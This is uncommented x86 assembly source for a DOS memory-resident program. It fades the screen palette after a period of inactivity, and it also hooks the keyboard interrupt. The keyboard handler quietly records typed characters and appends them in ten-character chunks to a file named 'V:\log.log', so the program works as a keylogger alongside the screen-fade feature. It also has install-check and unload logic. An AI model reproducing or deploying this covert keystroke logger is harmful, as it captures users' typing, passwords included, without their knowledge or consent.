.186
LOCALS  @@
        ACTIVATE        EQU   10
        PROCESS_INT     EQU 16H

CODE    SEGMENT
        ASSUME          CS:CODE, DS:CODE
        ORG             100H
BEGIN:  JMP             START

        KBHANDLER       DD    0
        TIMERHANDLER    DD    0
        MULTIPLEX       DD    0
        TIME            DW    0
        STATE           DB    16
        FINISH          DB    0

        PNTR            DB    0
        BUF             DB    10 DUP(0)
        FILE            DB    'V:\log.log', 0
        EXCEPT          DB    8, 26, 27, 0


KB      PROC
        PUSHF
        CALL            CS:KBHANDLER
        MOV             CS:FINISH, 1
        
        PUSH            DS
        PUSHA   
        XOR             BP,  BP
        MOV             AX,  40H
        MOV             DS,  AX
        MOV             BX,  DS:[1CH]
        IN              AL,  60H
        CMP             AL,  16
        JA              @@5
        DEC             BX
        DEC             BX
        CMP             BX,  1EH
        JNB             @@1
        MOV             BX,  3CH

@@1:    MOV             BX,  DS:[BX]
        MOV             AX,  CS
        MOV             DS,  AX

@@2:    CMP             BL, EXCEPT[BP]
        JE              @@5
        INC             BP
        CMP             EXCEPT[BP],  0
        JNZ             @@2
        XOR             AX,  AX
        MOV             AL,  PNTR
        MOV             BP,  AX
        MOV             BUF[BP],  BL
        INC             PNTR
        CMP             PNTR, 10
        JNE             @@5
        MOV             PNTR, 0
        PUSH            SS
        PUSH            SP
        PUSHA   
        MOV             AX,  CS
        MOV             DS,  AX
        MOV             AH,  3DH
        MOV             AL,  1
        LEA             DX,  FILE
        INT             21H
        JNC             @@3
        MOV             AH,  3CH
        MOV             CX,  20H
        LEA             DX,  FILE
        INT             21H
        JC              @@4

@@3:    MOV             BX,  AX
        MOV             AH,  42H
        MOV             AL,  2
        XOR             DX,  DX
        XOR             CX,  CX
        INT             21H
        MOV             AH,  40H
        MOV             CX,  10
        LEA             DX,  BUF
        INT             21H
        MOV             AH,  3EH
        INT             21H

@@4:    POPA    
        POP             SP
        POP             SS

@@5:    POPA    
        POP             DS
        IRET
KB      ENDP


CALC    PROC
        SHL             AL,   1
        SHL             AL,   1
        MUL             STATE
        MOV             AL,   AH
        RET
CALC    ENDP


SAVE    PROC
        MOV             CX,   16
        XOR             BX,   BX
@@1:    MOV             DX,   3C7H
        MOV             AL,   CL
        DEC             AL
        OUT             DX,   AL
        INC             DX
        INC             DX
        IN              AL,   DX
        MOV             BYTE  PTR START[BX], AL
        INC             BX
        IN              AL,   DX
        MOV             BYTE  PTR START[BX], AL
        INC             BX
        IN              AL,   DX
        MOV             BYTE  PTR START[BX], AL
        INC             BX
        LOOP            @@1
        RET
SAVE    ENDP


RESTORE PROC
        MOV             CX,   16
        XOR             BX,   BX
@@1:    MOV             DX,   3C8H
        MOV             AL,   CL
        DEC             AL
        OUT             DX,   AL
        INC             DX
        MOV             AL,   BYTE PTR START[BX]
        OUT             DX,   AL
        INC             BX
        MOV             AL,   BYTE PTR START[BX]
        OUT             DX,   AL
        INC             BX
        MOV             AL,   BYTE PTR START[BX]
        OUT             DX,   AL
        INC             BX
        LOOP            @@1
        RET
RESTORE ENDP


FADE    PROC
        MOV             CX,   16
        XOR             BX,   BX
@@1:    MOV             DX,   3C8H
        MOV             AL,   CL
        DEC             AL
        OUT             DX,   AL
        INC             DX
        MOV             AL,   BYTE PTR START[BX]
        INC             BX
        CALL            CALC
        OUT             DX,   AL
        MOV             AL,   BYTE PTR START[BX]
        INC             BX
        CALL            CALC
        OUT             DX,   AL
        MOV             AL,   BYTE PTR START[BX]
        INC             BX
        CALL            CALC
        OUT             DX,   AL
        LOOP            @@1
        RET
FADE    ENDP


TIMER   PROC
        PUSH            DS
        PUSH            AX
        PUSH            BX
        PUSH            CX
        PUSH            DX
        PUSH            CS
        POP             DS

        CMP             FINISH, 1
        JNZ             @@3
        MOV             TIME,   0
        MOV             FINISH, 0
        CMP             STATE,  16
        JE              @@1
        MOV             STATE,  16
        CALL            VERTRET
        CALL            RESTORE
        JMP             @@1

@@3:    CMP             STATE,  1
        JB              @@1
        INC             TIME
        CMP             TIME,   ACTIVATE
        JNE             @@2
        CALL            SAVE

@@2:    CMP             TIME,   ACTIVATE
        JNA             @@1
        CALL            VERTRET
        CALL            FADE
        DEC             STATE

@@1:    POP             DX
        POP             CX
        POP             BX
        POP             AX
        POP             DS
        PUSHF
        CALL            CS:TIMERHANDLER
        IRET
TIMER   ENDP


VERTRET PROC
        MOV             DX,     03DAH

@@1:    IN              AL,     DX
        TEST            AL,     8
        JZ              @@1

@@2:    IN              AL,     DX
        TEST            AL,     8
        JNZ             @@2
        RET
VERTRET ENDP


UNLOAD  PROC
        PUSH            ES
        PUSH            DS
        PUSH            DX
        PUSH            AX

        MOV             AX,     2509H
        LDS             DX,     CS:KBHANDLER
        INT             21H

        MOV             AX,     251CH
        LDS             DX,     CS:TIMERHANDLER
        INT             21H

        MOV             AH,     25H
        MOV             AL,     PROCESS_INT
        LDS             DX,     CS:MULTIPLEX
        INT             21H

        MOV             ES,     CS:2CH
        MOV             AH,     49H
        INT             21H

        PUSH            CS
        POP             ES
        MOV             AH,     49H
        INT             21H

        POP             AX
        POP             DX
        POP             DS
        POP             ES
        RET
UNLOAD  ENDP


MULTY   PROC
        CMP             AH,     0C8H
        JNE             @@1
        CMP             AL,     0
        JE              @@2
        CMP             AL,     1
        JNE             @@1
        CALL            UNLOAD
        IRET

@@2:    MOV             AL,     0FFH
        MOV             DX,     6772H
        MOV             CX,     6162H
        IRET

@@1:    JMP             CS:MULTIPLEX
MULTY   ENDP

START:  CALL            ARGS
        MOV             AH,     0C8H
        MOV             AL,     0
        INT             PROCESS_INT
        CMP             AL,     0FFH
        JNE             @@2
        CMP             DX,     6772H
        JNE             @@2
        CMP             CX,     6162H
        JE              @@1
        
@@2:    CLI
        MOV             AX,     3509H
        INT             21H
        MOV             WORD    PTR KBHANDLER, BX
        MOV             WORD    PTR KBHANDLER+2, ES

        MOV             AX,     351CH
        INT             21H
        MOV             WORD    PTR TIMERHANDLER, BX
        MOV             WORD    PTR TIMERHANDLER+2, ES

        MOV             AH,     35H
        MOV             AL,     PROCESS_INT
        INT             21H
        MOV             WORD    PTR MULTIPLEX, BX
        MOV             WORD    PTR MULTIPLEX+2, ES

        MOV             AX,     2509H
        MOV             DX,     OFFSET KB
        INT             21H

        MOV             AX,     251CH
        MOV             DX,     OFFSET TIMER
        INT             21H

        MOV             AH,     25H
        MOV             AL,     PROCESS_INT
        MOV             DX,     OFFSET MULTY
        INT             21H
        STI

        MOV             AX,     3100H
        MOV             DX,     (START-BEGIN+1CFH)/16
        INT             21H

@@1:    MOV             AX,     4C01H
        INT             21H

ARGS    PROC
        MOV             SI,     80H
        LODSB
        CMP             AL,     0
        JNZ             @@1

        JMP             @@3

@@1:    LODSB

        CMP             AL,     20H
        JE              @@1

        CMP             AL,     '/'
        JNE             @@3

        LODSB

        CMP             AL,     'u'
        JE              @@4

        CMP             AL,     'U'
        JE              @@4

        JMP             @@3

@@4:    MOV             AH,     0C8H
        MOV             AL,     0
        INT             PROCESS_INT

        CMP             AL,     0FFH
        JNE             @@5

        CMP             DX,     6772H
        JNE             @@5

        CMP             CX,     6162H
        JNE             @@5

        MOV             AX,     0C801H
        INT             PROCESS_INT

        MOV             AX,     4C00H
        INT             21H

@@5:    MOV             AX,     4C01H
        INT             21H
        
@@3:    RET

ARGS    ENDP


CODE    ENDS

        END             BEGIN